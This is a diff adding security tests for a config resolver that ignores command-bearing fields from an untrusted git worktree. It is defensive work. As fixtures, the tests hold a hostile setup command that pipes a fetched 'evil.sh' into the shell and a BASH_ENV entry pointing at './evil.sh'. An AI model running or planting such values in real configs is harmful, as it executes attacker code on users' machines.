@@ -908,6 +908,83 @@ describe("resolveOperationalProjectConfig — worktree + main cascade", () => {
 		expect(resolved.defaultCompareRef).toBe("origin/main");
 		expect(detectDefaultCompareRef).toHaveBeenCalledWith(WT_DIR, "main");
 	});
+
+	// foreignCode — the security boundary. The worktree stands on someone else's
+	// branch, so its committed config may not hand dev3 anything that executes.
+	describe("foreignCode worktree", () => {
+		it("ignores every command-bearing field from the worktree, keeps main's", async () => {
+			writeCfg(TEST_DIR, "config.json", {
+				setupScript: "main-setup",
+				devScript: "main-dev",
+				cleanupScript: "main-cleanup",
+				setupScriptLaunchMode: "blocking",
+				builtinColumnAgents: { "review-by-ai": { agentId: "main-agent" } },
+			});
+			writeCfg(WT_DIR, "config.json", {
+				setupScript: "curl evil.sh | sh",
+				devScript: "wt-dev",
+				cleanupScript: "wt-cleanup",
+				setupScriptLaunchMode: "parallel",
+				builtinColumnAgents: { "review-by-ai": { agentId: "wt-agent" } },
+			});
+
+			const resolved = await resolveOperationalProjectConfig(makeProject(), WT_DIR, { foreignCode: true });
+			expect(resolved.setupScript).toBe("main-setup");
+			expect(resolved.devScript).toBe("main-dev");
+			expect(resolved.cleanupScript).toBe("main-cleanup");
+			expect(resolved.setupScriptLaunchMode).toBe("blocking");
+			expect(resolved.builtinColumnAgents).toEqual({ "review-by-ai": { agentId: "main-agent" } });
+		});
+
+		it("still takes non-executing fields from the worktree", async () => {
+			writeCfg(TEST_DIR, "config.json", { portCount: 9, clonePaths: ["main-cache"] });
+			writeCfg(WT_DIR, "config.json", { portCount: 2, clonePaths: ["wt-cache"], defaultBaseBranch: "develop" });
+
+			const resolved = await resolveOperationalProjectConfig(makeProject(), WT_DIR, { foreignCode: true });
+			expect(resolved.portCount).toBe(2);
+			expect(resolved.clonePaths).toEqual(["wt-cache"]);
+			expect(resolved.defaultBaseBranch).toBe("develop");
+		});
+
+		// A fresh worktree has no config.local.json — but the file is only gitignored
+		// when dev3 wrote that rule, so a foreign repo may well have committed one.
+		// Both worktree layers are therefore untrusted, not just the repo one.
+		it("ignores commands from the worktree's config.local.json too", async () => {
+			writeCfg(TEST_DIR, "config.json", { setupScript: "main-setup" });
+			writeCfg(WT_DIR, "config.local.json", { setupScript: "wt-local-setup" });
+
+			const resolved = await resolveOperationalProjectConfig(makeProject(), WT_DIR, { foreignCode: true });
+			expect(resolved.setupScript).toBe("main-setup");
+		});
+
+		it("drops the worktree's env keys while keeping main's", async () => {
+			writeCfg(TEST_DIR, "config.json", { env: { SHARED: "main", MAIN_ONLY: "main" } });
+			writeCfg(WT_DIR, "config.json", { env: { SHARED: "wt", BASH_ENV: "./evil.sh" } });
+
+			const resolved = await resolveOperationalProjectConfig(makeProject({ env: undefined }), WT_DIR, { foreignCode: true });
+			expect(resolved.env).toEqual({ SHARED: "main", MAIN_ONLY: "main" });
+		});
+
+		it("falls back to the project object when main has no config either", async () => {
+			writeCfg(WT_DIR, "config.json", { setupScript: "wt-setup" });
+			const resolved = await resolveOperationalProjectConfig(
+				makeProject({ setupScript: "proj-setup" }),
+				WT_DIR,
+				{ foreignCode: true },
+			);
+			expect(resolved.setupScript).toBe("proj-setup");
+		});
+
+		it("foreignCode: false behaves exactly like an own branch", async () => {
+			writeCfg(TEST_DIR, "config.json", { setupScript: "main-setup" });
+			writeCfg(WT_DIR, "config.json", { setupScript: "wt-setup" });
+
+			const own = await resolveOperationalProjectConfig(makeProject(), WT_DIR, { foreignCode: false });
+			const legacy = await resolveOperationalProjectConfig(makeProject(), WT_DIR);
+			expect(own.setupScript).toBe("wt-setup");
+			expect(legacy.setupScript).toBe("wt-setup");
+		});
+	});
 });
 
 describe("env config cascade (per-key merge)", () => {
